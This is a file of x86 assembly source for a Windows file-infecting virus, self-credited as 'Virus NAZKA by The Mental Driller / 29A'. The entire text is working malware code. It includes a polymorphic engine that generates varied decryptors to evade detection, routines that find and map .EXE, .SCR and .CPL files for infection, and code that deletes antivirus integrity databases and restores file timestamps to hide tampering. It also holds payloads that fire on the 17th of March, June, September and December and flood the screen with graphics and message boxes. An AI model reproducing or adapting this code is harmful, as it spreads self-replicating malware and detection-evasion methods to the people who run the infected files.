S_ESP   equ     0Ch
S_EBP   equ     08h
S_ESI   equ     04h
S_EDI   equ     00h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Dumb polymorphic engine :)                                     ;;
;; Just made only to avoid having the same decryptors every time. ;;
;; It has been made in two hours or so, so it isn't very complex. ;;
;; That's very easy to emulate, but I wasn't in the mood to make  ;;
;;  a bigger one in a weekend (well, just wait for the finishing  ;;
;;  of the eternally durable coding of the Tuareg engine :P )     ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; EAX=Displacement from the beginning till the virus
; ECX=Place where the decryptors must be put
; Size of encrypted part is Virus_Size+1000h

PutDecryptors   proc
                pusha
                mov     [ebp+Distance], eax
                mov     [ebp+DecryptorsBeginAddress], ecx
                mov     edi, ecx
                mov     byte ptr [ebp+NumberOfDecryptor], 0

      ; Initializing of the random generator
                lea     eax, [ebp+offset SystemTimeReceiver]
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime]
                mov     eax, [ebp+DwordAleatorio1]
                xor     eax, [ebp+DwordAleatorio2]
                mov     [ebp+DwordAleatorio3], eax ; We make it slow poly

   @@MakeNextDecryptor:

   ; Register selection
   @@Select1:   call    Random
                and     al, 7
                cmp     al, 4
                jz    @@Select1
                mov     [ebp+KeyRegister], al
                mov     dl, al
   @@Select2:   call    Random
                and     al, 7
                cmp     al, 4
                jz    @@Select2
                cmp     al, dl
                jz    @@Select2
                mov     [ebp+CounterRegister], al
                mov     dh, al
   @@Select3:   call    Random
                and     al, 7
                cmp     al, 4
                jz    @@Select3
                cmp     al, dh
                jz    @@Select3
                cmp     al, dl
                jz    @@Select3
                mov     [ebp+IndexRegister], al

                lea     ebx, [ebp+offset PutCounterValue]
                lea     ecx, [ebp+offset PutIndexValue]
                lea     edx, [ebp+offset PutKeyValue]
                call    RandomCalling
                mov     [ebp+InicLoop], edi

                movzx   ecx, byte ptr [ebp+NumberOfDecryptor]
                mov     al, byte ptr [ebp+4*ecx+EncryptType]
                cmp     al, 1
                jb    @@ADD
                jz    @@SUB
      @@XOR:    mov     al, 31h
                jmp   @@J_001
      @@ADD:    mov     al, 29h ; Just the inverse of ADD
                jmp   @@J_001
      @@SUB:    mov     al, 01h
      @@J_001:  stosb
                mov     al, [ebp+IndexRegister]
                cmp     al, 5
                jnz   @@J_002
                or      al, 40h
      @@J_002:  mov     dl, [ebp+KeyRegister]
                shl     dl, 3
                or      al, dl
                stosb
                cmp     al, 40h
                jb    @@J_003
                xor     al, al
                stosb
      @@J_003:  lea     ebx, [ebp+offset IncreaseIndex]
                lea     ecx, [ebp+offset DecreaseCounter]
                lea     edx, [ebp+offset @@Return]
                call    RandomCalling

 ;; Select counter zero checking
      @@Again1: call    RandomFlags
                jz    @@OtherSet
                js    @@Again1
    @@TEST:     mov     al, 85h
                jmp   @@PutOpcode
    @@OtherSet: js    @@OR
    @@AND:      mov     al, 23h
                jmp   @@PutOpcode
    @@OR:       mov     al, 0Bh
   @@PutOpcode: stosb
                mov     al, 0C0h
                mov     dl, [ebp+CounterRegister]
                or      al, dl
                shl     dl, 3
                or      al, dl
                stosb

  ;; Select jump to the begin of the loop
                call    RandomFlags
                jz    @@PutJNZ
     @@PutJNS:  mov     al, 79h
                jmp   @@PutJump
     @@PutJNZ:  mov     al, 75h
     @@PutJump: stosb
                inc     edi
                mov     eax, [ebp+InicLoop]
                sub     eax, edi
                mov     [edi-1], al
                inc     byte ptr [ebp+NumberOfDecryptor]
                cmp     byte ptr [ebp+NumberOfDecryptor], 3
                jnz   @@MakeNextDecryptor

                lea     ecx, [edi+5]
                sub     ecx, [ebp+DecryptorsBeginAddress]
                mov     eax, [ebp+Distance]
                sub     eax, ecx
                push    eax
                mov     al, 0E9h
                stosb
                pop     eax
                stosd
                popa
  @@Return:     ret
PutDecryptors   endp

NumberOfDecryptor       db      0
DecryptorsBeginAddress  dd      0
Distance                dd      0
InicLoop                dd      0
IndexRegister   db      0
CounterRegister db      0
KeyRegister     db      0

IncreaseIndex   proc
                pusha
                mov     dl, [ebp+IndexRegister]
                mov     byte ptr [ebp+SubtractFlag], 0
                mov     cl, 4
CommonEntryForModification:
@@IncreaseAgain:
                call    RandomFlags
                jz    @@Next
                js    @@PutINC
@@PutSUB:       mov     byte ptr [ebp+PutADDFlag], 0
@@CommonPutADDSUB:
                or      dl, dl
                jnz   @@NotSUBEAX
                mov     al, 2Dh
                stosb
                jmp   @@Again1
   @@NotSUBEAX: mov     ax, 0E883h
                or      ah, dl
                stosw
      @@Again1: call    Random
                and     eax, 3
                inc     al
                cmp     al, cl
                ja    @@Again1
                sub     cl, al
                cmp     byte ptr [ebp+PutADDFlag], 1
                jz    @@Jump3
                cmp     byte ptr [ebp+SubtractFlag], 1
                jz    @@Jump5
      @@Negate: neg     eax
                jmp   @@Jump5
      @@Jump3:  cmp     byte ptr [ebp+SubtractFlag], 1
                jz    @@Negate
      @@Jump5:  cmp     byte ptr [edi-1], 2Dh
                jnz   @@Jump1
                stosd
                jmp   @@Jump2
     @@Jump1:   stosb
     @@Jump2:   jmp   @@End                                

@@PutINC:       dec     cl
                mov     al, 40h
                cmp     byte ptr [ebp+SubtractFlag], 1
                jnz   @@Jump6
                add     al, 8
       @@Jump6: add     al, dl
                stosb
                jmp   @@End

       @@Next:  js    @@PutLEA
@@PutADD:       mov     byte ptr [ebp+PutADDFlag], 1
                jmp   @@CommonPutADDSUB

@@PutLEA:       mov     ah, dl
                shl     dl, 3
                or      ah, dl
                shr     dl, 3
                or      ah, 40h
                mov     al, 8Dh
                stosw
      @@Again2: call    Random
                and     al, 3
                inc     al
                cmp     al, cl
                ja    @@Again2
                sub     cl, al
                cmp     byte ptr [ebp+SubtractFlag], 1
                jnz   @@Jump7
                neg     al
       @@Jump7: stosb

       @@End:   or      cl, cl
                jnz   @@IncreaseAgain
                mov     [esp+S_EDI], edi
                popa
                ret
IncreaseIndex   endp

DecreaseCounter proc
                pusha
                mov     dl, [ebp+CounterRegister]
                mov     cl, 1
                mov     byte ptr [ebp+SubtractFlag], 1
                jmp     CommonEntryForModification
DecreaseCounter endp

PutADDFlag      db      0
SubtractFlag    db      0

PutCounterValue proc
                pusha
                mov     ecx, (Virus_Size+1000h)/4 + 1
                mov     dl, [ebp+CounterRegister]
                jmp     PutMOV
PutCounterValue endp

PutIndexValue   proc
                pusha
                mov     ecx, [ebp+RelocHeader]
                add     ecx, [ebp+MappingAddress]
                mov     ecx, [ecx+0Ch]
                mov     esi, [ebp+PEHeaderAddress]
                add     ecx, [esi+34h]
                mov     dl, [ebp+IndexRegister]
                jmp     PutMOV
PutIndexValue   endp

PutKeyValue     proc
                pusha
                movzx   ecx, byte ptr [ebp+NumberOfDecryptor]
                mov     ecx, dword ptr [4*ecx+ebp+DecryptKey]
                mov     dl, [ebp+KeyRegister]
PutKeyValue     endp

PutMOV          proc
                call    RandomFlags
                jz    @@Next
                js      PutMOV
@@PutMOV3:      mov     ax, 058Dh
                shl     dl, 3
                or      ah, dl
                stosw
     @@Store1:  mov     eax, ecx
                stosd
     @@Exit:    mov     [esp+S_EDI], edi
                popa
                ret
     @@Next:    js    @@PutMOV2
@@PutMOV1:      mov     al, 0B8h
                add     al, dl
                stosb
                jmp   @@Store1
@@PutMOV2:      mov     al, 68h
                stosb
                mov     eax, ecx
                stosd
                mov     al, 58h
                add     al, dl
                stosb
                jmp   @@Exit
PutMOV          endp

RandomCalling   proc
                mov     esi, 5
     @@Again:   call    RandomFlags
                jz    @@Jump1
                xchg    ebx, ecx
     @@Jump1:   call    RandomFlags
                jz    @@Jump2
                xchg    ecx, edx
     @@Jump2:   call    RandomFlags
                jz    @@Jump3
                xchg    edx, ebx
     @@Jump3:   dec     esi
                jnz   @@Again
                push    ebx
                push    ecx
                jmp     edx
RandomCalling   endp

RandomFlags             proc
                        push    eax
                        call    Random
                        sahf
                        pop     eax
                        ret
RandomFlags             endp

ConstructNameForReloc proc
                pusha
;; Method 2: Put a name like .?text or .?code
;; Method 1: A set of four to six chars with '.' at the beginning
                in      al, 40h
                test    al, 1
                jnz   @@RandomName
                and     al, 1Fh
                cmp     al, 19h
                jbe   @@OK
                sub     al, 19h
          @@OK: add     al, 61h
                mov     ah, al
                mov     al, '.'
                push    ax
                mov     eax, 'et?.'
                pop     ax
                mov     ebx, 0+'tx'
                mov     ecx, [ebp+RelocHeader]
                add     ecx, edi
                mov     dword ptr [ecx], eax
                mov     dword ptr [ecx+4], ebx
                popa
                ret
 @@RandomName:  mov     ecx, [ebp+RelocHeader]
                add     ecx, edi
                inc     ecx
                mov     edx, 4
                mov     eax, esp
    @@Loop_001: in      al, 40h
                xor     al, ah
                add     ah, al
                and     al, 1Fh
                add     al, 61h
                cmp     al, 79h
                jbe   @@OK2
                sub     al, 19h
     @@OK2:     mov     [ecx], al
                inc     ecx
                dec     edx
                jnz   @@Loop_001
                mov     byte ptr [ecx], 0
                popa
                ret
ConstructNameForReloc endp

FindFileMask1   db      '*.EXE',0
FindFileMask2   db      '*.SCR',0
FindFileMask3   db      '*.CPL',0

OpenFile        proc
                push    0
                push    0
                push    3
                push    0
                push    0
                push    0c0000000h
                push    ebx
                call    dword ptr [ebp+RVA_CreateFileA]
                inc     eax
                jz    @@Error
                dec     eax
                mov     dword ptr [ebp+FileHandle], eax
                clc
                ret
      @@Error:  stc
                ret
OpenFile        endp

MapFile         proc
                push    0
                push    dword ptr [ebp+FileSizeLow]
                push    0
                push    4
                push    0
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_CreateFileMappingA]
                or      eax, eax
                jz    @@FinError
                mov     dword ptr [ebp+MappingHandle], eax
                push    dword ptr [ebp+FileSizeLow]
                push    0
                push    0
                push    2
                push    dword ptr [ebp+MappingHandle]
                call    dword ptr [ebp+RVA_MapViewOfFile]
                or      eax, eax
                jc    @@FinError2
                mov     dword ptr [ebp+MappingAddress], eax
                clc
                ret
@@FinError2:    push    dword ptr [ebp+MappingHandle]
                call    dword ptr [ebp+RVA_CloseHandle]
@@FinError:     stc
                ret
MapFile         endp

MappingHandle   dd      0
MappingAddress  dd      0
FileHandle      dd      0

UnmapFile       proc
                push    dword ptr [ebp+MappingAddress]
                call    dword ptr [ebp+RVA_UnmapViewOfFile]
                push    dword ptr [ebp+MappingHandle]
                call    dword ptr [ebp+RVA_CloseHandle]
                ret
UnmapFile       endp

CheckFileName   proc
                push    ebx
                push    edx
                lea     esi, [ebp+FileName]
                mov     ebx, esi
                dec     ebx
    @@Loop_001: lodsb
                or      al, al
                jnz   @@Loop_001
                std
                dec     esi
                dec     esi
    @@Loop_002: lodsb
                cmp     al, '\'
                jz    @@EndName2
                cmp     al, ':'
                jz    @@EndName2
                cmp     esi, ebx
                jnz   @@Loop_002
                jmp   @@EndName
    @@EndName2: inc     esi
    @@EndName:  cld
                inc     esi
                lodsw
                movzx   edx, ax
                call    ToLower
                cmp     edx, 0+'bt'
                jz    @@Error
                cmp     edx, 0+'cs'
                jz    @@Error
                cmp     edx, 0+'-f'
                jz    @@Error
                cmp     edx, 0+'ap'
                jz    @@Error
                cmp     edx, 0+'rd'
                jz    @@Error
                dec     esi
                dec     esi
                dec     esi
     @@Again:   inc     esi
                cmp     byte ptr [esi], 'v'
                jz    @@Error
                cmp     byte ptr [esi], 'V'
                jz    @@Error
                cmp     byte ptr [esi], 0
                jnz   @@Again
                mov     edx, [esi-4]
                call    ToLower
                cmp     edx, 'exe.'
                jz    @@ItsOK
                cmp     edx, 'rcs.'
                jnz   @@Error
                cmp     eax, 'lpc.'
                jnz   @@Error
      @@ItsOK:  pop     edx
                pop     ebx
                clc
                ret
      @@Error:  pop     edx
                pop     ebx
                stc
                ret
CheckFileName   endp

ToLower         proc
                push    ecx
                mov     ecx, 4
    @@Loop_001: cmp     dl, 'A'
                jb    @@Next
                cmp     dl, 'Z'
                ja    @@Next
                add     dl, 20h
      @@Next:   rol     edx, 8
                loop  @@Loop_001
                pop     ecx
                ret
ToLower         endp

DeleteDATs      proc
                lea     ebx, [ebp+FileDAT1]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT2]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT3]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT4]
                call    DeleteFile
                ret
DeleteDATs      endp

DeleteFile      proc
                push    80h
                push    ebx
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                push    ebx
                call    dword ptr [ebp+RVA_DeleteFileA]
                ret
DeleteFile      endp

FileDAT1        db      'AVP.CRC',0
FileDAT2        db      'ANTI-VIR.DAT',0
FileDAT3        db      'CHKLIST.MS',0
FileDAT4        db      'IVB.NTZ',0

RestoreDateTime proc
                lea     ebx, [ebp+CreationTime]
                push    ebx
                add     ebx, 8
                push    ebx
                add     ebx, 8
                push    ebx
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_SetFileTime]
                ret
RestoreDateTime endp

Addr_Kernel32   dd      0

;,,,,,,,,,,,,,
;;; PAYLOADS ;
;'''''''''''''
Payload         proc
                ;; Let's do the payload in the day 17 of March, June,
                ;; September and December
                lea     eax, [ebp+offset SystemTime]
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime]
                cmp     word ptr [ebp+Day], 11h
                jnz   @@Return
                mov     al, byte ptr [ebp+Month]
                cmp     al, 3
                jz    @@RunPayload
                cmp     al, 6
                jz    @@RunPayload
                cmp     al, 9
                jz    @@RunPayload
                cmp     al, 0Ch
                jnz   @@Return

  @@RunPayload: lea     eax, [ebp+ASC_User32]
                call    LoadLibrary
                jc    @@Return

                mov     [ebp+ModuleToUse], eax
                lea     esi, [ebp+CrunchedUser32Functions]
                lea     edx, [ebp+User32RVAs]
                call    GetRVAs
                jc    @@Return

                lea     eax, [ebp+ASC_GDI32]
                call    LoadLibrary
                jc    @@Return

                mov     [ebp+ModuleToUse], eax
                lea     esi, [ebp+CrunchedGDI32Functions]
                lea     edx, [ebp+GDI32RVAs]
                call    GetRVAs
                jc    @@Return

                push    0
                call    dword ptr [ebp+RVA_GetDC]
                mov     dword ptr [ebp+HandleDC], eax

    @@SelectPayload:
                in      al, 40h
                and     al, 3
                mov     byte ptr [ebp+PayloadIdent], al
                jz    @@SelectPayload
                cmp     al, 2
                jb    @@Payload1
  @@Payload2:   lea     ebx, [ebp+Payload2]
                jmp   @@CreateThread
  @@Payload1:   lea     ebx, [ebp+Payload1]
@@CreateThread: lea     eax, [ebp+offset RedBrush] ; Me la pela
                push    eax
                push    0
                push    0
                push    ebx
                push    0
                push    0
                call    dword ptr [ebp+RVA_CreateThread]
     @@Return:  ret
Payload         endp

Payload1        proc
                call  @@GetDeltaOffset
@@GetDeltaOffset:
                pop     ebp
                sub     ebp, offset @@GetDeltaOffset

                push    00FF0000h
                call    dword ptr [ebp+RVA_CreateSolidBrush]
                mov     dword ptr [ebp+RedBrush], eax
                push    0000FF00h
                call    dword ptr [ebp+RVA_CreateSolidBrush]
                mov     dword ptr [ebp+GreenBrush], eax
                push    000000FFh
                call    dword ptr [ebp+RVA_CreateSolidBrush]
                mov     dword ptr [ebp+BlueBrush], eax
                push    0000FFFFh
                call    dword ptr [ebp+RVA_CreateSolidBrush]
                mov     dword ptr [ebp+YellowBrush], eax
                push    00FF00FFh
                call    dword ptr [ebp+RVA_CreateSolidBrush]
                mov     dword ptr [ebp+MagentaBrush], eax

   @@Again:     lea     eax, [ebp+TimerProcedure]
                push    eax
                push    60h
                push    0
                push    0
                call    dword ptr [ebp+RVA_SetTimer]
                mov     [ebp+Timer], eax

                push    0
                push    offset MB_Title
                push    offset Identificator
                push    0
                call    dword ptr [ebp+RVA_MessageBoxA]

                push    dword ptr [ebp+Timer]
                push    0
                call    dword ptr [ebp+RVA_KillTimer]
                jmp   @@Again
Payload1        endp

Payload2        proc
                call  @@GetDeltaOffset
@@GetDeltaOffset:
                pop     ebp
                sub     ebp, offset @@GetDeltaOffset
     @@Again:   push    0
                call    dword ptr [ebp+RVA_GetDC]
                mov     dword ptr [ebp+HandleDC], eax

                push    0000FF00h
                push    dword ptr [ebp+HandleDC]
                call    dword ptr [ebp+RVA_SetTextColor]
                push    0
                push    dword ptr [ebp+HandleDC]
                call    dword ptr [ebp+RVA_SetBkColor]

                cmp     byte ptr [ebp+PayloadIdent], 2
                jz    @@SetPixel
    @@TextOutA: push    9
                lea     eax, [ebp+StringToScreen]
                push    eax
                jmp   @@Common

    @@SetPixel: call    Random
                and     eax, 0FFFFFFh
                push    eax
      @@Common: call    Random
                and     eax, 7FFh
                push    eax
                call    Random
                and     eax, 7FFh
                push    eax
                push    dword ptr [ebp+HandleDC]
                cmp     byte ptr [ebp+PayloadIdent], 2
                jz    @@SetPixel2
  @@TextOut2:   call    dword ptr [ebp+RVA_TextOutA]
                jmp   @@Again
  @@SetPixel2:  call    dword ptr [ebp+RVA_SetPixel]
                jmp   @@Again
Payload2        endp

StringToScreen  db      'N A Z K A'

PayloadIdent    db      0

Contador        db      0
Timer           dd      0

TimerProcedure  proc
                pusha
                call  @@GetDeltaOffset
@@GetDeltaOffset:
                pop     ebp
                sub     ebp, offset @@GetDeltaOffset
                movzx   ebx, byte ptr [ebp+Contador]
                inc     ebx
                cmp     bl, 5
                jnz   @@Continue1
                xor     bl, bl
 @@Continue1:   mov     byte ptr [ebp+Contador], bl
                xor     esi, esi

      @@Again:  push    0
                call    dword ptr [ebp+RVA_GetDC]
                mov     dword ptr [ebp+HandleDC], eax

                push    dword ptr [4*ebx+ebp+RedBrush]
                push    dword ptr [ebp+HandleDC]
                call    dword ptr [ebp+RVA_SelectObject]

                push    dword ptr [4*esi+ebp+Number]
                mov     eax, [4*esi+ebp+Letra]
                add     eax, ebp
                push    eax
                push    dword ptr [ebp+HandleDC]
                call    dword ptr [ebp+RVA_Polygon]
                dec     ebx
                jns   @@Salto
                mov     ebx, 4
      @@Salto:  inc     esi
                cmp     esi, 5
                jnz   @@Again
                popa
                ret
TimerProcedure  endp

HandleDC        dd      0

RedBrush        dd      0
BlueBrush       dd      0
GreenBrush      dd      0
YellowBrush     dd      0
MagentaBrush    dd      0

Number          dd      06h
                dd      04h
                dd      06h
                dd      07h
                dd      04h

Letra           dd      offset Letra1
                dd      offset Letra2
                dd      offset Letra3
                dd      offset Letra4
                dd      offset Letra5

Letra1          dd      0,    0
                dd      0h,   80h
                dd      40h,  20h
                dd      50h,  80h
                dd      50h,  0
                dd      10h,  60h

Letra2          dd      88h,  0
                dd      60h,  80h
                dd      88h,  20h
                dd      0B0h, 80h

Letra3          dd      0C0h, 0
                dd      100h, 10h
                dd      0C0h, 78h
                dd      110h, 70h
                dd      0D0h, 70h
                dd      110h, 8

Letra4          dd      120h, 0
                dd      120h, 80h
                dd      12Ch, 40h
                dd      170h, 80h
                dd      130h, 38h
                dd      170h, 0
                dd      12Ch, 30h

Letra5          dd      1A8h, 0
                dd      180h, 80h
                dd      1A8h, 20h
                dd      1D0h, 80h

MB_Title        db      'Virus NAZKA',0
Identificator   db      '(c) Virus NAZKA by The Mental Driller / 29A',0
                
LoadLibrary     proc
                push    eax
                call    dword ptr [ebp+RVA_LoadLibraryA]
                or      eax, eax
                jz    @@Error
                clc
                ret
       @@Error: stc
                ret
LoadLibrary     endp

ASC_User32      db      'user32.dll',0
ASC_GDI32       db      'gdi32.dll',0

CrunchedUser32Functions label   dword
ASC_GetDC               db      0F2h, 'DC',0
ASC_SetTimer            db      0F6h, 'Timer',0
ASC_KillTimer           db      'KillTimer',0
ASC_MessageBoxA         db      'MessageBoxA',0
                        db      0

CrunchedGDI32Functions  label   dword
ASC_CreateSolidBrush    db      0F0h, 'SolidBrush',0
ASC_Polygon             db      'Polygon',0
ASC_SelectObject        db      'SelectObject',0
ASC_SetTextColor        db      0F6h, 'TextColor',0
ASC_SetBkColor          db      0F6h, 'BkColor',0
ASC_SetPixel            db      0F6h, 'Pixel',0
ASC_TextOutA            db      'TextOutA',0
                        db      0

User32RVAs      label   dword
RVA_GetDC               dd      0
RVA_SetTimer            dd      0
RVA_KillTimer           dd      0
RVA_MessageBoxA         dd      0
GDI32RVAs       label   dword
RVA_CreateSolidBrush    dd      0
RVA_Polygon             dd      0
RVA_SelectObject        dd      0
RVA_SetTextColor        dd      0
RVA_SetBkColor          dd      0
RVA_SetPixel            dd      0
RVA_TextOutA            dd      0

;; 0F0h --> Create
;; 0F1h --> File
;; 0F2h --> Get
;; 0F3h --> DirectoryA
;; 0F4h --> Find
;; 0F5h --> Process
;; 0F6h --> Set
;; 0F7h --> AttributesA
ASC_Create      db      'Create'
ASC_Get         db      'Get'
ASC_DirectoryA  db      'DirectoryA'
ASC_Process     db      'Process'
ASC_Set         db      'Set'
ASC_AttributesA db      'AttributesA'

CrunchedASCIIs          label   dword
ASC_CreateFileA         db      0F0h, 0F1h, 'A',0
ASC_CreateProcessA      db      0F0h, 0F5h, 'A',0
ASC_FindFirstFileA      db      0F4h, 'First', 0F1h, 'A',0
ASC_FindNextFileA       db      0F4h, 'Next', 0F1h, 'A',0
ASC_GetFileAttributesA  db      0F2h, 0F1h, 0F7h,0
ASC_SetFileAttributesA  db      0F6h ,0F1h, 0F7h,0
ASC_GetFullPathNameA    db      0F2h, 'FullPathNameA',0
ASC_MoveFileA           db      'Move', 0F1h, 'A',0
ASC_CopyFileA           db      'Copy', 0F1h, 'A',0
ASC_DeleteFileA         db      'Delete', 0F1h, 'A',0
ASC_WinExec             db      'WinExec',0
ASC__lopen              db      '_lopen',0
ASC_MoveFileExA         db      'Move', 0F1h, 'ExA',0
ASC_OpenFile            db      'Open', 0F1h,0

ASC_WriteProcessMemory  db      'Write', 0F5h, 'Memory',0
ASC_GetCurrentProcess   db      0F2h, 'Current', 0F5h,0
ASC_CreateFileMappingA  db      0F0h, 0F1h, 'MappingA',0
ASC_MapViewOfFile       db      'MapViewOf', 0F1h,0
ASC_UnmapViewOfFile     db      'UnmapViewOf', 0F1h,0
ASC_CloseHandle         db      'CloseHandle',0
ASC_SetFilePointer      db      0F6h, 0F1h, 'Pointer',0
ASC_SetEndOfFile        db      0F6h, 'EndOf', 0F1h,0
ASC_SetFileTime         db      0F6h, 0F1h, 'Time',0
ASC_GetWindowsDirectoryA db     0F2h, 'Windows', 0F3h,0
ASC_GetCurrentDirectoryA db     0F2h, 'Current', 0F3h,0
ASC_SetCurrentDirectoryA db     0F6h, 'Current', 0F3h,0
ASC_GetSystemDirectoryA  db     0F2h, 'System', 0F3h,0
ASC_GetSystemTime       db      0F2h, 'SystemTime',0
ASC_LoadLibraryA        db      'LoadLibraryA',0
ASC_FindClose           db      0F4h, 'Close',0
ASC_VirtualAlloc        db      'VirtualAlloc',0
ASC_VirtualFree         db      'VirtualFree',0
ASC_CreateThread        db      0F0h, 'Thread',0
                        db      0

FunctionsToPatch        label   dword
RVA_GetProcAddress      dd      0
RVAs                    label   dword
RVA_CreateFileA         dd      0
RVA_CreateProcessA      dd      0
RVA_FindFirstFileA      dd      0
RVA_FindNextFileA       dd      0
RVA_GetFileAttributesA  dd      0
RVA_SetFileAttributesA  dd      0
RVA_GetFullPathNameA    dd      0
RVA_MoveFileA           dd      0
RVA_CopyFileA           dd      0
RVA_DeleteFileA         dd      0
RVA_WinExec             dd      0
RVA__lopen              dd      0
RVA_MoveFileExA         dd      0
RVA_OpenFile            dd      0

RVA_WriteProcessMemory  dd      0
RVA_GetCurrentProcess   dd      0
RVA_CreateFileMappingA  dd      0
RVA_MapViewOfFile       dd      0
RVA_UnmapViewOfFile     dd      0
RVA_CloseHandle         dd      0
RVA_SetFilePointer      dd      0
RVA_SetEndOfFile        dd      0
RVA_SetFileTime         dd      0
RVA_GetWindowsDirectoryA dd     0
RVA_GetCurrentDirectoryA dd     0
RVA_SetCurrentDirectoryA dd     0
RVA_GetSystemDirectoryA  dd     0
RVA_GetSystemTime       dd      0
RVA_LoadLibraryA        dd      0
RVA_FindClose           dd      0
RVA_VirtualAlloc        dd      0
RVA_VirtualFree         dd      0
RVA_CreateThread        dd      0

SystemTime              label   dword
  Year                  dw      0
  Month                 dw      0
  DayOfWeek             dw      0
  Day                   dw      0
  Hours                 dw      0
  Minutes               dw      0
  Seconds               dw      0
  Miliseconds           dw      0

org     SystemTime

FindFileField           label   dword
  FileAttributes        dd      0
  CreationTime          dd      0
                        dd      0
  LastAccessTime        dd      0
                        dd      0
  LastWriteTime         dd      0
                        dd      0
  FileSizeHigh          dd      0
  FileSizeLow           dd      0
  Reserved              dd      0
                        dd      0
  FileName              db      104h dup (0)
  AlternateFileName     db      10h dup (0)
FindFileFieldSize       equ     $ - offset FindFileField

Random                  proc
                        push    ecx
                        mov     eax, [ebp+DwordAleatorio1]
                        dec     dword ptr [ebp+DwordAleatorio1]
                        xor     eax, [ebp+DwordAleatorio2]
                        mov     ecx, eax
                        rol     dword ptr [ebp+DwordAleatorio1], cl
                        add     [ebp+DwordAleatorio1], eax
                        adc     eax, [ebp+DwordAleatorio2]
                        add     eax, ecx
                        ror     eax, cl
                        not     eax
                        sub     eax, 3
                        xor     [ebp+DwordAleatorio2], eax
                        xor     eax, [ebp+DwordAleatorio3]
                        rol     dword ptr [ebp+DwordAleatorio3], 1
                        sub     dword ptr [ebp+DwordAleatorio3], ecx
                        sbb     dword ptr [ebp+DwordAleatorio3], 4
                        inc     dword ptr [ebp+DwordAleatorio2]
                        pop     ecx
                        ret
Random                  endp

SystemTimeReceiver label dword
DwordAleatorio1 dd      12345678h
DwordAleatorio2 dd      9ABCDEF0h
DwordAleatorio3 dd      0A40d1739h ; :))

DecrunchBuffer  db      21 dup (0)

                align   4    ; Align on a 4-byte boundary
End_Virus       label   dword

FakedHost:      push    0
                push    offset Titulo
                push    offset Mensaje
                push    0
                call    MessageBoxA

      @@Fin:    push    0
                call    ExitProcess

                end     Nazka
